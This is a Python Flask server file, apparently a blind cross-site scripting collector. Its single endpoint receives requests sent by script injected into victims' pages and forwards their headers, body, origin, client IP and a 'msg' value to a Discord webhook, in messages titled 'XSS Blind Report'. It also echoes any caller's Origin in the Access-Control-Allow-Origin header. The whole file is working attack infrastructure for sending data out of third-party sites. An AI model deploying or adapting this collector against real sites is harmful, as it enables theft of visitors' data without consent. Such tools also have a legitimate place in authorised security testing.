from flask import Flask, request
import requests
import flask
import urllib
app = Flask(__name__)


@app.route('/reqBXX', methods=['GET', 'POST'])
def send_request():
    # Extract HTTP parts of the request
    http_method = request.method
    http_url = request.url
    http_headers = request.headers
    http_data = str(request.data)
    req_msg_param_value = 'null' if request.form.get('msg') == None else {urllib.parse.unquote_plus(str(request.form.get('msg')))}
    origin_of_req = 'null' if request.environ.get('HTTP_ORIGIN', 'default value') == None else str(request.environ.get('HTTP_ORIGIN', 'default value'))
    # Send HTTP parts to Discord webhook
    webhook_url = "__BXX_DISCORD__"
    webhook_data = {}

    message_embeds = [{ "description":f"Request send from:\n Origin: {origin_of_req}\n\n \
                              Sender ip address:\n{request.headers.getlist('X-Forwarded-For')[0]}\n\n \
                              Message:\n{req_msg_param_value}\n\n \
                              -------------------------------------------------------------------------\n\
                             ```Method: {http_method} \nURL: {http_url} \n\nHeaders:\n{http_headers}\nData:\n{http_data}```", \
                             "title":"XSS Blind Report", \
                             }]
    webhook_data["embeds"] = message_embeds

    requests.post(webhook_url, json = webhook_data)

    # Set Access-Control-Allow-Origin header to allow all origins
    response_headers = {
        'Access-Control-Allow-Origin': '*'
    }
    response = f"OK , {req_msg_param_value} , {origin_of_req}\n"
    resp = flask.Response(response)
    resp.headers['Access-Control-Allow-Origin'] = request.environ.get('HTTP_ORIGIN', 'default value')
    return resp

if __name__ == '__main__':
    app.run()

